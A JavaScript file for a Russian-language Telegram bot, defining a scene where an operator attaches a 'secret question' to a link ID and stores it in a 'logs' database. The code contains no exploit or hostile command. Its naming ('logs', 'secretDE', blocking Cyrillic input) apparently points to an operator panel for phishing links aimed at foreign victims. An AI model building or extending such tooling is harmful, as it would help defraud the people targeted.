const { Scenes } = require('telegraf')
const logs = require('../../database/models/log')

const secretWork = new Scenes.WizardScene('secretDE', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        ctx.wizard.state.data.id = ctx.callbackQuery.data.split(' ')[1]

        await ctx.replyWithHTML(`<b>Введите секретный вопрос...</b>\n<b>ID Ссылки:</b> <code>${ctx.wizard.state.data.id}</code>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Отменить', callback_data: 'nazad' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        console.log(e)
        await ctx.replyWithHTML(`Неизвестная команда.`)
        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        let regexp = /[а-яё]/i
        if (regexp.test(ctx.message.text)) {
            await ctx.replyWithHTML(`Вы ввели текст на русском языке. Не думаю, что это хорошая идея. Нажмите на кнопку "Пароль" ещё раз и попробуйте снова...`)
            return await ctx.scene.leave()
        } else {
            ctx.wizard.state.data.secret = ctx.message.text
            await ctx.replyWithHTML(`<b>Для ID</b> <code>${ctx.wizard.state.data.id}</code> <b>был передан секретный вопрос:</b> ${ctx.wizard.state.data.secret}`)
            await logs.findOneAndUpdate({ link: ctx.wizard.state.data.id }, { $set: { secret: ctx.wizard.state.data.secret } }, { new: true })
            return ctx.scene.leave()
        }
    } catch (e) {
        console.log(e)
        await ctx.replyWithHTML(`Неизвестная команда.`)
        return ctx.scene.leave()
    } 
})

/* const secretWork = new Scenes.BaseScene('secretDE')

secretWork.enter(async (ctx) => {
    try {
        ctx.session.data = {}
        ctx.session.data.id = ctx.callbackQuery.data.split(' ')[1]

        await ctx.replyWithHTML(`<b>Введите секретный вопрос...</b>\n<b>ID Ссылки:</b> <code>${ctx.session.data.id}</code>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Отменить', callback_data: 'nazad' }]
                ]
            }
        })
    } catch (e) {
        console.log(e)
    }
})

secretWork.on('text', async (ctx) => {
    let regexp = /[а-яё]/i
    if (regexp.test(ctx.message.text)) {
        await ctx.replyWithHTML(`Вы ввели текст на русском языке. Не думаю, что это хорошая идея. Нажмите на кнопку "Секретка" ещё раз и попробуйте снова...`)
        return ctx.scene.leave()
    } else {
        ctx.session.data.secret = ctx.message.text
        await ctx.replyWithHTML(`<b>Для ID</b> <code>${ctx.session.data.id}</code> <b>был передан секретный вопрос:</b> ${ctx.session.data.secret}`)
        await logs.findOneAndUpdate({ link: ctx.session.data.id }, { $set: { secret: ctx.session.data.secret } }, { new: true })
        return ctx.scene.leave()
    }
}) */

secretWork.action('nazad', async (ctx) => {
    try {
        await ctx.deleteMessage(ctx.callbackQuery.message.message_id)
        return await ctx.scene.leave()
    } catch (e) {
        console.log(e)
    }
})

module.exports = secretWork